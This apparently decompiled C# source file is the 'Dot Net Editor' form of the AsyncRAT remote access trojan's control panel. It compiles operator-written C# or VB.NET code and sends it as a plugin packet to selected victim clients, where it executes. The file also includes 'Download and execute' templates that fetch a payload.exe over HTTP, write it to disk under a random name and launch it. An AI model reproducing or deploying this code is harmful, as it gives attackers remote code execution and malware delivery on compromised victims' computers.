using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using FastColoredTextBoxNS;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms;

public class FormDotNetEditor : Form
{
	private Dictionary<string, string> providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };

	private IContainer components;

	private Panel panel1;

	private Label label3;

	private ComboBox comboHelper;

	private Label label2;

	private ListBox listBoxReferences;

	private Label label1;

	private ComboBox comboLang;

	private Panel panel2;

	private ContextMenuStrip menuReferences;

	private Button button2;

	private Button button1;

	private ToolStripMenuItem addToolStripMenuItem;

	private ToolStripMenuItem removeToolStripMenuItem;

	private Button button3;

	private FastColoredTextBox txtBox;

	private Panel panel3;

	public FormDotNetEditor()
	{
		InitializeComponent();
	}

	private void FormDotNetEditor_Load(object sender, EventArgs e)
	{
		comboLang.SelectedIndex = 0;
		comboHelper.SelectedIndex = 1;
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (listBoxReferences.Items.Count == 0 || string.IsNullOrWhiteSpace(((Control)(object)txtBox).Text))
		{
			return;
		}
		if (!((Control)(object)txtBox).Text.ToLower().Contains("try") && !((Control)(object)txtBox).Text.ToLower().Contains("catch"))
		{
			MessageBox.Show("Please add try catch", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
		if (Program.form1.listView1.SelectedItems.Count > 0)
		{
			List<string> list = new List<string>();
			foreach (string item in listBoxReferences.Items)
			{
				list.Add(item);
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "executeDotNetCode";
			msgPack.ForcePathObject("Option").AsString = comboLang.Text;
			msgPack.ForcePathObject("Code").AsString = ((Control)(object)txtBox).Text;
			msgPack.ForcePathObject("Reference").AsString = string.Join(",", list);
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (ListViewItem selectedItem in Program.form1.listView1.SelectedItems)
			{
				ThreadPool.QueueUserWorkItem(((Clients)selectedItem.Tag).Send, msgPack2.Encode2Bytes());
			}
			MessageBox.Show("Executed!", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		else
		{
			MessageBox.Show("Selected client = 0", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
	}

	private void ComboLang_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (comboLang.SelectedIndex == 0)
		{
			txtBox.Language = (Language)1;
			FastColoredTextBox obj = txtBox;
			string text = (((Control)(object)txtBox).Text = GetCode(comboLang.Text, comboHelper.Text));
			((Control)(object)obj).Text = text;
		}
		else
		{
			txtBox.Language = (Language)2;
			((Control)(object)txtBox).Text = GetCode(comboLang.Text, comboHelper.Text);
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		txtBox.Clear();
	}

	private void ComboHelper_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (comboHelper.SelectedIndex == 0)
		{
			if (comboLang.SelectedIndex == 0)
			{
				FastColoredTextBox obj = txtBox;
				FastColoredTextBox obj2 = txtBox;
				string text = (((Control)(object)txtBox).Text = GetCode(comboLang.Text, comboHelper.Text));
				string text2 = (((Control)(object)obj2).Text = text);
				((Control)(object)obj).Text = text2;
			}
			else
			{
				FastColoredTextBox obj3 = txtBox;
				string text2 = (((Control)(object)txtBox).Text = GetCode(comboLang.Text, comboHelper.Text));
				((Control)(object)obj3).Text = text2;
			}
		}
		if (comboHelper.SelectedIndex == 1)
		{
			if (comboLang.SelectedIndex == 0)
			{
				FastColoredTextBox obj4 = txtBox;
				string text2 = (((Control)(object)txtBox).Text = GetCode(comboLang.Text, comboHelper.Text));
				((Control)(object)obj4).Text = text2;
			}
			else
			{
				((Control)(object)txtBox).Text = GetCode(comboLang.Text, comboHelper.Text);
			}
		}
	}

	private string GetCode(string lang, string code)
	{
		switch (lang)
		{
		case "C#":
			switch (code)
			{
			case "Hello world":
				return "using System;\r\nusing System.Windows.Forms;\r\nnamespace AsyncRAT\r\n{\r\n    public class Program\r\n    {\r\n        public static void Main(string[] args)\r\n        {\r\n            try\r\n            {\r\n                MessageBox.Show(\"Hello World\");\r\n            }\r\n            catch { }\r\n        }\r\n    }\r\n}";
			case "Download and execute":
				return "using System.Net;\r\nusing System.IO;\r\nusing System.Diagnostics;\r\n\r\nnamespace AsyncRAT\r\n{\r\n    public class Program\r\n    {\r\n        public static void Main()\r\n        {\r\n            try\r\n            {\r\n                using (WebClient wc = new WebClient())\r\n                {\r\n                    try\r\n                    {\r\n                        string name = Path.GetRandomFileName() + \".exe\";\r\n                        byte[] buffer = wc.DownloadData(\"http://127.0.0.1/payload.exe\");\r\n                        File.WriteAllBytes(name, buffer);\r\n                        Process.Start(name);\r\n                    }\r\n                    catch { }\r\n                }\r\n            }\r\n            catch { }\r\n        }\r\n    }\r\n}\r\n";
			}
			break;
		case "VB.NET":
			switch (code)
			{
			case "Hello world":
				return "Imports System\r\nImports System.Windows.Forms\r\n\r\nNamespace AsyncRAT\r\n    Public Class Program\r\n        Public Shared Sub Main(ByVal args As String())\r\n            Try\r\n                MessageBox.Show(\"Hello World\")\r\n            Catch\r\n            End Try\r\n        End Sub\r\n    End Class\r\nEnd Namespace\r\n\r\n";
			case "Download and execute":
				return "Imports System.Net\r\nImports System.IO\r\nImports System.Diagnostics\r\n\r\nNamespace AsyncRAT\r\n    Public Class Program\r\n        Public Shared Sub Main()\r\n            Try\r\n\r\n                Using wc As WebClient = New WebClient()\r\n\r\n                    Try\r\n                        Dim name As String = Path.GetRandomFileName() & \".exe\"\r\n                        Dim buffer As Byte() = wc.DownloadData(\"http://127.0.0.1/payload.exe\")\r\n                        File.WriteAllBytes(name, buffer)\r\n                        Process.Start(name)\r\n                    Catch\r\n                    End Try\r\n                End Using\r\n\r\n            Catch\r\n            End Try\r\n        End Sub\r\n    End Class\r\nEnd Namespace\r\n\r\n";
			}
			break;
		}
		return "";
	}

	private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listBoxReferences.SelectedItems.Count == 1)
		{
			listBoxReferences.Items.Remove(listBoxReferences.SelectedItem);
		}
	}

	private void AddToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Add Reference", "References");
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		foreach (string item in listBoxReferences.Items)
		{
			if (item == text)
			{
				return;
			}
		}
		listBoxReferences.Items.Add(text);
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		if (listBoxReferences.Items.Count == 0 || string.IsNullOrWhiteSpace(((Control)(object)txtBox).Text))
		{
			return;
		}
		if (!((Control)(object)txtBox).Text.ToLower().Contains("try") && !((Control)(object)txtBox).Text.ToLower().Contains("catch"))
		{
			MessageBox.Show("Please add try catch", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
		List<string> list = new List<string>();
		foreach (string item in listBoxReferences.Items)
		{
			list.Add(item);
		}
		switch (comboLang.Text)
		{
		case "C#":
			Compiler(new CSharpCodeProvider(providerOptions), ((Control)(object)txtBox).Text, string.Join(",", list).Split(new string[1] { "," }, StringSplitOptions.RemoveEmptyEntries));
			break;
		case "VB.NET":
			Compiler(new VBCodeProvider(providerOptions), ((Control)(object)txtBox).Text, string.Join(",", list).Split(new string[1] { "," }, StringSplitOptions.RemoveEmptyEntries));
			break;
		}
	}

	private void Compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
	{
		try
		{
			new Dictionary<string, string>().Add("CompilerVersion", "v4.0");
			string compilerOptions = "/target:winexe /platform:anycpu /optimize-";
			CompilerParameters options = new CompilerParameters(referencedAssemblies)
			{
				GenerateExecutable = true,
				GenerateInMemory = true,
				CompilerOptions = compilerOptions,
				TreatWarningsAsErrors = false,
				IncludeDebugInformation = false
			};
			CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(options, source);
			if (compilerResults.Errors.Count > 0)
			{
				IEnumerator enumerator = compilerResults.Errors.GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						CompilerError compilerError = (CompilerError)enumerator.Current;
						MessageBox.Show($"{compilerError.ErrorText}\nLine: {compilerError.Line}", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					}
					return;
				}
				finally
				{
					IDisposable disposable = enumerator as IDisposable;
					if (disposable != null)
					{
						disposable.Dispose();
					}
				}
			}
			compilerResults = null;
			MessageBox.Show("No Error!", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_09c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d1: Expected O, but got Unknown
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormDotNetEditor));
		this.panel1 = new System.Windows.Forms.Panel();
		this.button3 = new System.Windows.Forms.Button();
		this.button2 = new System.Windows.Forms.Button();
		this.button1 = new System.Windows.Forms.Button();
		this.label3 = new System.Windows.Forms.Label();
		this.comboHelper = new System.Windows.Forms.ComboBox();
		this.label2 = new System.Windows.Forms.Label();
		this.listBoxReferences = new System.Windows.Forms.ListBox();
		this.menuReferences = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.addToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.removeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.label1 = new System.Windows.Forms.Label();
		this.comboLang = new System.Windows.Forms.ComboBox();
		this.panel2 = new System.Windows.Forms.Panel();
		this.panel3 = new System.Windows.Forms.Panel();
		this.txtBox = new FastColoredTextBox();
		this.panel1.SuspendLayout();
		this.menuReferences.SuspendLayout();
		this.panel2.SuspendLayout();
		this.panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.txtBox).BeginInit();
		base.SuspendLayout();
		this.panel1.Controls.Add(this.label3);
		this.panel1.Controls.Add(this.comboHelper);
		this.panel1.Controls.Add(this.label2);
		this.panel1.Controls.Add(this.listBoxReferences);
		this.panel1.Controls.Add(this.label1);
		this.panel1.Controls.Add(this.comboLang);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Right;
		this.panel1.Location = new System.Drawing.Point(914, 0);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(215, 633);
		this.panel1.TabIndex = 0;
		this.button3.Location = new System.Drawing.Point(375, 6);
		this.button3.Name = "button3";
		this.button3.Size = new System.Drawing.Size(95, 43);
		this.button3.TabIndex = 8;
		this.button3.Text = "Test";
		this.button3.UseVisualStyleBackColor = true;
		this.button3.Click += new System.EventHandler(Button3_Click);
		this.button2.Location = new System.Drawing.Point(148, 6);
		this.button2.Name = "button2";
		this.button2.Size = new System.Drawing.Size(95, 43);
		this.button2.TabIndex = 7;
		this.button2.Text = "Reset";
		this.button2.UseVisualStyleBackColor = true;
		this.button2.Click += new System.EventHandler(Button2_Click);
		this.button1.Location = new System.Drawing.Point(606, 6);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(95, 43);
		this.button1.TabIndex = 6;
		this.button1.Text = "Execute";
		this.button1.UseVisualStyleBackColor = true;
		this.button1.Click += new System.EventHandler(Button1_Click);
		this.label3.AutoSize = true;
		this.label3.Location = new System.Drawing.Point(4, 522);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(60, 20);
		this.label3.TabIndex = 5;
		this.label3.Text = "Helper:";
		this.comboHelper.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboHelper.FormattingEnabled = true;
		this.comboHelper.Items.AddRange(new object[2] { "Download and execute", "Hello world" });
		this.comboHelper.Location = new System.Drawing.Point(8, 554);
		this.comboHelper.Name = "comboHelper";
		this.comboHelper.Size = new System.Drawing.Size(195, 28);
		this.comboHelper.TabIndex = 4;
		this.comboHelper.SelectedIndexChanged += new System.EventHandler(ComboHelper_SelectedIndexChanged);
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(4, 96);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(96, 20);
		this.label2.TabIndex = 3;
		this.label2.Text = "References:";
		this.listBoxReferences.ContextMenuStrip = this.menuReferences;
		this.listBoxReferences.FormattingEnabled = true;
		this.listBoxReferences.ItemHeight = 20;
		this.listBoxReferences.Items.AddRange(new object[5] { "System.dll", "System.Windows.Forms.dll", "Microsoft.VisualBasic.dll", "System.Management.dll", "System.Drawing.dll" });
		this.listBoxReferences.Location = new System.Drawing.Point(8, 128);
		this.listBoxReferences.Name = "listBoxReferences";
		this.listBoxReferences.Size = new System.Drawing.Size(195, 364);
		this.listBoxReferences.TabIndex = 2;
		this.menuReferences.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.menuReferences.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.addToolStripMenuItem, this.removeToolStripMenuItem });
		this.menuReferences.Name = "menuReferences";
		this.menuReferences.ShowImageMargin = false;
		this.menuReferences.Size = new System.Drawing.Size(125, 68);
		this.addToolStripMenuItem.Name = "addToolStripMenuItem";
		this.addToolStripMenuItem.Size = new System.Drawing.Size(124, 32);
		this.addToolStripMenuItem.Text = "Add";
		this.addToolStripMenuItem.Click += new System.EventHandler(AddToolStripMenuItem_Click);
		this.removeToolStripMenuItem.Name = "removeToolStripMenuItem";
		this.removeToolStripMenuItem.Size = new System.Drawing.Size(124, 32);
		this.removeToolStripMenuItem.Text = "Remove";
		this.removeToolStripMenuItem.Click += new System.EventHandler(RemoveToolStripMenuItem_Click);
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(4, 12);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(85, 20);
		this.label1.TabIndex = 1;
		this.label1.Text = "Language:";
		this.comboLang.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboLang.FormattingEnabled = true;
		this.comboLang.Items.AddRange(new object[2] { "C#", "VB.NET" });
		this.comboLang.Location = new System.Drawing.Point(8, 40);
		this.comboLang.Name = "comboLang";
		this.comboLang.Size = new System.Drawing.Size(195, 28);
		this.comboLang.TabIndex = 0;
		this.comboLang.SelectedIndexChanged += new System.EventHandler(ComboLang_SelectedIndexChanged);
		this.panel2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.panel2.Controls.Add((System.Windows.Forms.Control)(object)this.txtBox);
		this.panel2.Location = new System.Drawing.Point(12, 12);
		this.panel2.Name = "panel2";
		this.panel2.Size = new System.Drawing.Size(884, 554);
		this.panel2.TabIndex = 1;
		this.panel3.Controls.Add(this.button1);
		this.panel3.Controls.Add(this.button3);
		this.panel3.Controls.Add(this.button2);
		this.panel3.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panel3.Location = new System.Drawing.Point(0, 572);
		this.panel3.Name = "panel3";
		this.panel3.Size = new System.Drawing.Size(914, 61);
		this.panel3.TabIndex = 1;
		this.txtBox.AutoCompleteBracketsList = new char[10] { '(', ')', '{', '}', '[', ']', '"', '"', '\'', '\'' };
		this.txtBox.AutoIndentCharsPatterns = "\r\n^\\s*[\\w\\.]+(\\s\\w+)?\\s*(?<range>=)\\s*(?<range>[^;]+);\r\n^\\s*(case|default)\\s*[^:]*(?<range>:)\\s*(?<range>[^;]+);\r\n";
		this.txtBox.AutoScrollMinSize = new System.Drawing.Size(599, 264);
		this.txtBox.BackBrush = null;
		this.txtBox.BracketsHighlightStrategy = (BracketsHighlightStrategy)1;
		this.txtBox.CharHeight = 22;
		this.txtBox.CharWidth = 12;
		((System.Windows.Forms.Control)(object)this.txtBox).Cursor = System.Windows.Forms.Cursors.IBeam;
		this.txtBox.DisabledColor = System.Drawing.Color.FromArgb(100, 180, 180, 180);
		((System.Windows.Forms.Control)(object)this.txtBox).Dock = System.Windows.Forms.DockStyle.Fill;
		this.txtBox.IsReplaceMode = false;
		this.txtBox.Language = (Language)1;
		this.txtBox.LeftBracket = '(';
		this.txtBox.LeftBracket2 = '{';
		((System.Windows.Forms.Control)(object)this.txtBox).Location = new System.Drawing.Point(0, 0);
		((System.Windows.Forms.Control)(object)this.txtBox).Name = "txtBox";
		this.txtBox.Paddings = new System.Windows.Forms.Padding(0);
		this.txtBox.RightBracket = ')';
		this.txtBox.RightBracket2 = '}';
		this.txtBox.SelectionColor = System.Drawing.Color.FromArgb(60, 0, 0, 255);
		this.txtBox.ServiceColors = (ServiceColors)resources.GetObject("txtBox.ServiceColors");
		((System.Windows.Forms.Control)(object)this.txtBox).Size = new System.Drawing.Size(884, 554);
		((System.Windows.Forms.Control)(object)this.txtBox).TabIndex = 2;
		((System.Windows.Forms.Control)(object)this.txtBox).Text = resources.GetString("txtBox.Text");
		this.txtBox.Zoom = 100;
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(1129, 633);
		base.Controls.Add(this.panel3);
		base.Controls.Add(this.panel2);
		base.Controls.Add(this.panel1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FormDotNetEditor";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		this.Text = "Dot Net Editor";
		base.Load += new System.EventHandler(FormDotNetEditor_Load);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		this.menuReferences.ResumeLayout(false);
		this.panel2.ResumeLayout(false);
		this.panel3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.txtBox).EndInit();
		base.ResumeLayout(false);
	}
}
